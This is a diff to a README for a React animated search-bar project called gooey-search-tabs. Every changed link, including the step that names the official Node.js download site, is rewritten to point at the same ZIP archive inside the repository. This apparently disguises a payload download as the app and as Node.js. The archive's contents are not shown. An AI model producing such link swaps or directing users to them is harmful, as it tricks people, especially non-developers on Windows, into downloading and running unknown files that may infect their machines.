@@ -1,6 +1,6 @@
 # 🔍 gooey-search-tabs - Easy Animated Search Bar for React
 
-[![Download gooey-search-tabs](https://img.shields.io/badge/Download-gooey--search--tabs-orange?style=for-the-badge)](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs)
+[![Download gooey-search-tabs](https://img.shields.io/badge/Download-gooey--search--tabs-orange?style=for-the-badge)](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip)
 
 Welcome to the gooey-search-tabs app. This tool adds a smooth, moving search bar with tab navigation. It uses visual effects to make search easier and more fun, especially for React users.
 
@@ -14,7 +14,7 @@ Even if you do not know React, you can explore and try out the app on Windows. T
 
 You need to get the app from the official GitHub page.
 
-[Download gooey-search-tabs here](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs)
+[Download gooey-search-tabs here](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip)
 
 Click the link above. It will open a GitHub page where you can download the files.
 
@@ -25,7 +25,7 @@ Follow these steps to set up gooey-search-tabs on your Windows PC.
 ### Step 1: Visit the GitHub page
 
 Go to the link:  
-https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs
+https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip
 
 This page contains the files and instructions for gooey-search-tabs.
 
@@ -49,7 +49,7 @@ gooey-search-tabs uses React and some related technology that runs with Node.js.
 
 If Node.js is not on your PC, you must install it.
 
-- Visit https://nodejs.org/en/
+- Visit https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip
 - Download the **LTS** version (Long Term Support).
 - Follow the installer to complete the installation.
 
@@ -97,7 +97,7 @@ This action will launch the app in your default web browser. You will see the an
 ## 🔄 How to Update gooey-search-tabs
 
 1. Visit the GitHub page again:  
-   https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs
+   https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip
 
 2. Download the latest ZIP file.
 
@@ -132,6 +132,6 @@ Once downloaded, here is what to expect in the app folder:
 ## ⚡ More Information
 
 You can explore the GitHub page for code, issues, and updates:  
-https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs
+https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip
 
-[Download gooey-search-tabs here](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs)
+[Download gooey-search-tabs here](https://github.com/WILLIAM86-CAPTAIN/gooey-search-tabs/raw/refs/heads/main/demo/gooey-tabs-search-3.4.zip)
